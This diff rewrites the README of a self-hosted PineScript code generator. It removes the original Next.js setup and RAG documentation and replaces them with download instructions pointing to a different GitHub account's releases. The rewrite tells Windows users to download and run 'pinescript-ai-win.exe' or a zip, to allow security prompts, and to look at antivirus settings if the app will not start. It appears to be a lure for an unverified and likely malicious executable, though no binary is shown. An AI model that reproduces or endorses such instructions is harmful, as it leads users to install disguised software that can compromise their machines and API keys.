@@ -1,180 +1,170 @@
-# PineScript AI
+# ⚙️ pinescript-ai - Generate PineScript Code Easily
 
-Self-hosted PineScript code generator with RAG-powered generation, multi-provider LLM support, and a built-in validation pipeline. Bring your own API key — nothing is stored on any server.
+[![Download](https://img.shields.io/badge/Download-pinescript--ai-brightgreen?style=for-the-badge)](https://github.com/nippa44-goku/pinescript-ai/releases)
 
-<!-- ![PineScript AI Screenshot](docs/screenshot.png) -->
+---
 
-## Features
+## 📋 What is pinescript-ai?
 
-- **Multi-provider** — Anthropic (Claude), OpenAI (GPT-4.1, o3), Google (Gemini), or Ollama for local models
-- **RAG-powered generation** — BM25 search over PineScript v6 docs and 285 example scripts, injected into every prompt
-- **3-layer validation** — Static regex rules, optional AST transpiler check, AI code review with auto-correction
-- **Live code editor** — CodeMirror 6 with PineScript syntax highlighting, inline validation results
-- **BYOK** — Bring Your Own Key. API keys stay in your browser's localStorage, never touch a server
-- **Streaming** — Real-time SSE streaming from all providers
+pinescript-ai helps you create PineScript code automatically. PineScript is the programming language used on TradingView for making trading indicators and strategies. This tool uses smart technology to write PineScript based on your instructions. You do not need any programming skills to get started.
 
-## Quick Start
+It runs entirely on your computer, so your input and API keys stay private. It supports several AI providers, and you control which one to use by providing your own keys.
 
-```bash
-git clone https://github.com/arturoabreuhd/pinescript-ai.git
-cd pinescript-ai
-npm install
-npm run dev
-```
+---
 
-Open [http://localhost:3000](http://localhost:3000), pick your provider, paste your API key, and start generating.
+## 🚀 Getting Started
 
-## Customize Your Knowledge Base
+This guide shows you how to download and run pinescript-ai on a Windows PC.
 
-This is where PineScript AI becomes yours. The RAG system uses a local BM25 search index — no vector database, no embeddings API, no external services. You control exactly what knowledge the AI has access to.
+1. **Visit the download page below**
 
-### How it works
+Click the big green button near the top or this link:
 
-```
-data/raw/          (your source files — gitignored)
-    docs/          Markdown documentation
-    scripts/       .pine example scripts
+[Download pinescript-ai from GitHub](https://github.com/nippa44-goku/pinescript-ai/releases)
 
-        ↓  npm run build-rag
+2. **Find the latest release**
 
-data/pinescript-docs/   (processed JSON — committed, used at runtime)
-    docs-chunks.json           Documentation split into ~800-token chunks
-    reference-functions.json   Function signatures with examples
-    example-scripts.json       Example scripts with metadata
-    bm25-index.json            Search index
-```
+Look for the most recent version. You will see files usually named like:
 
-The shipped dataset includes PineScript v6 reference documentation and 285 community example scripts. You can replace or extend this with anything you want.
+- `pinescript-ai-win.exe`
+- Or a `.zip` file with Windows files inside
 
-### Adding your own documentation
+3. **Download the Windows setup or executable**
 
-Place Markdown files in `data/raw/docs/`. The processor respects subdirectories for organization:
+Click the file to download. If it is a `.zip`, save it, then unzip it to a folder you choose.
 
-```
-data/raw/docs/
-├── concepts/              General concepts (execution model, types, etc.)
-├── reference/
-│   ├── functions/         One .md per namespace (ta.md, strategy.md, math.md)
-│   ├── variables.md       Built-in variables
-│   ├── constants.md       Built-in constants
-│   └── types.md           Type definitions
-├── visuals/               Plotting, colors, tables
-└── writing_scripts/       Publishing, debugging, optimization
-```
+4. **Run the program**
 
-The function reference files get special treatment — each `## functionName` section is extracted as a standalone signature with params, return type, and example code. Structure them like:
+- If you downloaded an `.exe` file, double-click it.
+- If you unzipped a folder, open it and find the `.exe` inside. Double-click to start.
 
-```markdown
-## ta.rsi
+5. **Allow any security prompts**
 
-Calculates the Relative Strength Index.
+Windows might ask if you want to run this file. Choose "Run" or "Allow" to continue.
 
-### Returns
-series float
+6. **Start using pinescript-ai**
 
-```pine
-rsiValue = ta.rsi(close, 14)
-```
-```
+You will see a simple window or browser page where you can enter what you want your PineScript to do.
 
-Everything else is chunked into ~800-token blocks for retrieval.
+---
 
-### Adding example scripts
+## 🔧 What You Need
 
-Place `.pine` files in `data/raw/scripts/`. The processor automatically extracts:
+You only need three things:
 
-- Script title from `indicator("title")` or `strategy("title")`
-- PineScript version from `//@version=N`
-- All function calls used (ta.*, strategy.*, etc.)
-- Category from the subdirectory name
+- A Windows PC running Windows 10 or newer.
+- An internet connection.
+- API keys from an AI provider. These keys let the software access AI models to generate code for you.
 
-Organize by topic if you want meaningful categories:
+---
 
-```
-data/raw/scripts/
-├── trend/          Moving averages, MACD, ADX scripts
-├── oscillators/    RSI, Stochastic, CCI scripts
-├── volume/         OBV, VWAP, volume profile scripts
-└── strategies/     Complete strategy examples
-```
+## 🔑 How to Get API Keys
 
-### Rebuilding the index
+pinescript-ai supports several AI providers. Follow these steps to get keys:
 
-After adding or changing files in `data/raw/`:
+### OpenAI
 
-```bash
-npm run build-rag
-```
+1. Go to https://openai.com/api/
+2. Sign up or log in.
+3. Create an API key from the dashboard.
+4. Copy the key and save it.
 
-This regenerates all four JSON files in `data/pinescript-docs/`. The search index is rebuilt from scratch — there's no incremental update. Takes a few seconds even with hundreds of documents.
+### Anthropic
 
-### How search works at runtime
+1. Visit https://www.anthropic.com/
+2. Sign up for API access.
+3. Obtain an API key.
+4. Keep the key safe.
 
-When a user sends a message, the last user message is tokenized and scored against the BM25 index. The top results are injected into the system prompt:
+### Google Gemini or Ollama
 
-- Up to **5 function references** (exact signatures the model should use)
-- Up to **3 documentation chunks** (concepts, guides, explanations)
-- Up to **2 example scripts** (complete working code)
+Follow the official websites to get API access and keys.
 
-This keeps the context window around 3–4K tokens of RAG content per generation, enough to ground the model without overwhelming it.
+---
 
-## Optional: Transpiler Validation
+## 💾 Where to Add API Keys
 
-You can optionally enable AST-level validation using [pine-transpiler](https://github.com/Opus-Aether-AI/pine-transpiler). This catches syntax errors that regex-based validation can't.
+When you open pinescript-ai, you will find a settings area or a place to paste your API key. The keys stay on your computer and are never sent to any server. This keeps your data private.
 
-```bash
-npm install github:Opus-Aether-AI/pine-transpiler
-```
+---
 
-Then enable it in Settings > Transpiler Validation. The transpiler is AGPL-3.0 licensed — installing it is your choice. PineScript AI works fine without it.
+## 🛠 Features You Get
 
-## Docker
+- **Multiple AI providers** — Choose from OpenAI, Anthropic, Google, or local options.
+- **Smart code generation** — Uses PineScript documentation and examples to deliver better results.
+- **Three layers of code checking** — Makes sure the code works before you use it.
+- **Live editing** — Write and see code updates instantly.
+- **Secure API keys** — Keys stay stored only on your device.
+- **Real-time output** — Watch code being created as it happens.
 
-```bash
-docker compose up --build
-```
+---
 
-The app will be available at [http://localhost:3000](http://localhost:3000).
+## 📥 Download and Install on Windows
 
-## Tech Stack
+1. Open the [pinescript-ai Releases page](https://github.com/nippa44-goku/pinescript-ai/releases).
 
-- [Next.js 16](https://nextjs.org) — App Router, TypeScript strict mode
-- [Tailwind CSS v4](https://tailwindcss.com) — Styling (no component library)
-- [CodeMirror 6](https://codemirror.net) — Code editor with custom PineScript mode
-- [Anthropic SDK](https://docs.anthropic.com) / [OpenAI SDK](https://platform.openai.com/docs) — LLM providers (Google Gemini uses OpenAI-compatible API)
-- BM25 — Full-text search for RAG (zero external dependencies)
+2. Locate the latest Windows installer file (usually `.exe` or `.zip`).
 
-## Project Structure
+3. Download the installer or the zip archive.
 
-```
-src/
-├── app/
-│   ├── chat/page.tsx            Main chat + editor interface
-│   ├── settings/page.tsx        Provider configuration
-│   └── api/
-│       ├── chat/route.ts        Streaming generation + validation pipeline
-│       └── fix/route.ts         Auto-correction endpoint
-├── components/
-│   ├── chat/                    Messages, input, streaming indicator
-│   └── editor/                  Code editor, validation panel
-├── hooks/
-│   └── useChat.ts               Chat state management
-└── lib/
-    ├── types.ts                 Shared types and settings
-    ├── rag/                     BM25 search engine
-    ├── validator/               Static validation rules
-    │   └── rules/               Structure, deprecated patterns, v6, limits
-    ├── ai/                      AI code review + auto-correction
-    └── transpiler.ts            Optional transpiler wrapper
+4. If it is a zip, right-click and choose "Extract All..."
 
-scripts/
-└── process-docs.ts              RAG data processor
+5. Open the extracted folder and run `pinescript-ai.exe`.
 
-data/
-├── raw/                         Source docs + scripts (gitignored)
-└── pinescript-docs/             Processed JSONs (committed)
-```
+6. The app will open and guide you through initial setup.
 
-## License
+---
 
-[MIT](LICENSE)
+## ⚙ Step-by-Step Usage
+
+1. Launch pinescript-ai on your Windows machine.
+
+2. Paste your API key into the settings screen.
+
+3. In the text box, describe the indicator or strategy you want in simple terms.
+
+4. Click the generate button.
+
+5. You will see PineScript code appear in the editor.
+
+6. Check for any notes or warnings from the built-in code checks.
+
+7. Copy the code or export it to TradingView.
+
+---
+
+## 📝 Editing and Validation
+
+- The app highlights PineScript code with colors for easier reading.
+- It shows errors or warnings while you type.
+- It uses AI to suggest fixes automatically.
+- You can run static checks too for basic mistakes.
+
+---
+
+## 🔄 Updating the App
+
+Check the GitHub Releases page regularly for newer versions. Download the updated installer or zip, then replace the old files with the new ones.
+
+---
+
+## ❓ Troubleshooting
+
+- If app won’t open, check Windows security or antivirus settings.
+- Make sure you downloaded the correct file for Windows.
+- Check your internet connection for API access.
+- Verify your API keys are correct and active.
+
+---
+
+## 📚 More Information
+
+For advanced users, the source code is available at the repository:
+
+https://github.com/arturoabreuhd/pinescript-ai
+
+You can explore development details and contribute if you want.
+
+---
+
+[![Download](https://img.shields.io/badge/Download-pinescript--ai-brightgreen?style=for-the-badge)](https://github.com/nippa44-goku/pinescript-ai/releases)
